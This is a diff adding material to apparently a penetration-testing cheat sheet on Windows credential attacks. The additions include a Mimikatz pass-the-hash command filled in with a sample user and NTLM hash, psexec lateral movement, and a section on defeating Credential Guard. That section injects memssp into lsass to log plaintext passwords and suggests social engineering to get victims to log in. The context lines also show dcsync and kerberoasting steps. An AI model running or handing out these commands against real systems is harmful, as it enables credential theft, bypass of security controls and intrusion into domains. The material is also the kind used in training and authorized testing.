@@ -41,7 +41,11 @@ sekurlsa::logonPasswords full
 mimikatz.exe privilege::debug "sekurlsa::pth /user:<username> /rc4:<NTLM hash> /domain:<DOMAIN> /run:<Command>" exit
 # sekurlsa::pth is a module that allows us to perform a Pass the Hash attack by starting a process using the hash of the user's password
 # /run:<Command>: For example /run:cmd.exe
-# 2. After that, we canuse cmd.exe to execute commands in the user's context. 
+# 2. After that, we can use cmd.exe to execute commands in the user's context. 
+
+# Example for Pass The Hash attack in windows:
+mimikatz.exe sekurlsa::pth /domain:htb.local /user:jackie.may /rc4:ad11e823e1638def97afa7cb08156a94 /run:cmd.exe
+
 
 # Run a dcsync attack:
 .\mimikatz.exe privilege::debug "lsadump::dcsync /domain:$domain /user:Administrator" exit
@@ -71,6 +75,10 @@ kerberos::ptt  {ticketname}
 
 # Now the ticket is loaded in our machine 1. We can now do a dir on machine2
 dir \\machine2\c$
+
+# Or 
+psexec \\machine2 cmd.exe
+
 ```
 
 ## An Example
@@ -152,3 +160,58 @@ hashcat -m 13100 ServiceName_tgs_hashcat /usr/share/wordlists/rockyou.txt
 ```
 
 If we decide to skip the base64 output with Mimikatz and type `mimikatz # kerberos::list /export`, the .kirbi file (or files) will be written to disk. In this case, we can download the file(s) and run `kirbi2john.py` against them directly, skipping the base64 decoding step.
+
+
+## Evading Windows Credential Guard
+
+### What is Windows Credential Guard and how it protects password dumping
+
+Unlike local account hashes which are stored in the SAM, credential information such as domain hashes are stored in the memory of the **lsass.exe** process. Fortunately, _Mimikatz_ can locate these stored credentials for us.  Because of this Microsoft has introduced several mitigations to attempt to combat this.
+
+When Windows Credential Guard is enabled (check with Get-ComputerInfo), the Local Security Authority (LSASS) environment runs as a trustlet in VTL1 named  LSAISO.exe (LSA Isolated) and communicates with the **LSASS.exe** process running in VTL0 through an RCP channel.
+
+>[_Virtualization-based Security (VBS)_](https://docs.microsoft.com/en-us/windows-hardware/design/device-experiences/oem-vbs) is a software technology which creates and isolates secure regions of memory which become the _root of trust_ of the operating system. VBS runs a [_hypervisor_](https://www.redhat.com/en/topics/virtualization/what-is-a-hypervisor) on the physical hardware rather than running on the operating system. Specifically, VBS is implemented through [_Hyper-V_](https://en.wikipedia.org/wiki/Hyper-V), Microsoft's native hypervisor. In addition, Microsoft built the [_Virtual Secure Mode_](https://learn.microsoft.com/en-us/virtualization/hyper-v-on-windows/tlfs/vsm) (VSM) which is a set of hypervisor capabilities offered to the Hyper-V partitions. VSM maintains this isolation through what is known as [_Virtual Trust Levels_](https://github.com/microsoft/MSRC-Security-Research/blob/master/presentations/2019_02_OffensiveCon/2019_02%20-%20OffensiveCon%20-%20Growing%20Hypervisor%200day%20with%20Hyperseed.pdf) (VTLs). Each VTL represents a separate isolated memory region and currently Microsoft supports up to 16 levels, ranked from least privileged, VTL0, to VTL1, with VTL1 having more privileges than VTL0 and so on. As of the writing of this module Windows uses two VTLs:
+>
+>- _VTL0_ (VSM Normal Mode): Contains the Windows environment that hosts regular user-mode processes as well as a normal kernel (_nt_) and kernel-mode data.
+>- _VTL1_ (VSM Secure Mode): Contains an isolated Windows environment used for critical functionalities.
+>
+>The user-mode in VTL1 is known as [_Isolated User-Mode (IUM)_](https://learn.microsoft.com/en-us/windows/win32/procthread/isolated-user-mode--ium--processes), which consists of IUM processes known as _Trusted Processes_, _Secure Processes_, or _Trustlets_.
+>
+>Microsoft has used VSM as a base for several mitigations including _Device Guard_, _virtual TPMs_ and _Credential Guard_.
+
+In this Module, we'll focus on [_Credential Guard_](https://learn.microsoft.com/en-us/windows/security/identity-protection/credential-guard/how-it-works) mitigation. When enabled, the _Local Security Authority (LSASS)_ environment runs as a trustlet in VTL1 named _LSAISO.exe (LSA Isolated)_ and communicates with the **LSASS.exe** process running in VTL0 through an RCP channel.
+
+Mimikatz can peruse the memory of the LSASS process and retrieve cached hashes, credentials and information. With the new process running in VTL1, all the cached hashes and credential information is stored there, rather than in the memory of the LSASS process, meaning we can't access it.
+
+
+### The workaround for Windows Credential Guard: abusing Security Support Provider Interfaces (SSPI)
+
+Given that we can't retrieve cached hashes and credentials, we must change our focus. Instead of trying to get this information after a user has already logged into the box, we could attempt to intercept the credentials while a user is logging in.
+
+Microsoft provides quite a few [_authentication mechanisms_](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-r2-and-2008/dn169024\(v=ws.10\)) as part of the Windows operating system such as _Local Security Authority (LSA) Authentication_, _Winlogon_, _Security Support Provider Interfaces (SSPI)_, etc.
+
+Specifically, SSPI is foundational as it is used by all applications and services that require authentication. By default, Windows provides several _Security Support Providers (SSP)_ such as _Kerberos Security Support Provider_, _NTLM Security Support Provider_, etc. these are incorporated into the SSPI as DLLs and when authentication happens the SSPI decides which one to use.
+
+Additionally the SSP can also be registered through the _HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa\Security Packages_ registry key. Each time the system starts up, the _Local Security Authority_ (lsass.exe) loads the SSP DLLs present in the list pointed to by the registry key.
+
+What this means is that if we were to develop our own SSP and register it with _LSASS_, we could maybe force the SSPI to use our malicious Security Support Provider DLL for authentication.
+
+Fortunately, Mimikatz already supports this through the [_memssp_](https://tools.thehacker.recipes/mimikatz/modules/misc/memssp), which not only provides the required Security Support Provider (SSP) functionality but injects it directly into the memory of the **lsass.exe** process without dropping any DLLs on disk.
+
+The Mimikatz SSP takes advantage of the fact that a SSP is called with plaintext credentials through the SSPI allowing us to intercept them directly without needing to resort to a hash.
+
+### Bypassing Windows Credential Guard 
+
+```bash
+mimikatz.exe
+privilege::debug
+misc::memssp
+```
+
+When injecting a SSP into _LSASS_ using Mimikatz, the credentials will be saved in a log file, **C:\Windows\System32\mimilsa.log**.
+
+```bash
+type C:\Windows\System32\mimilsa.log
+```
+
+At this point, we have two options, we can either be patient and wait for another user to remotely connect to the machine or we can resort to additional techniques such as social engineering to coerce someone to log in.
